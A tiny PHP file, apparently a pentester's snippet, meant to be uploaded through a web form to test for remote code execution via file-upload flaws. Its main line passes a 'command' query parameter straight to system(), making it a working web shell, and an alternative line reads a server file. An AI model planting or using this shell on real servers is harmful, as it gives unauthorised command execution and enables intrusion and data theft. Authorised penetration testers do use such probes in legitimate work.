<?php
// use for via possible rce file upload vulns
// use either

// this
echo system($_GET['command']);

// or
echo file_get_contents('/endpoint/to/check');


//with the php tags //<?php and ?+>
// at the beggining or end

// in a file and upload to test if file upload vulns are possible
?>
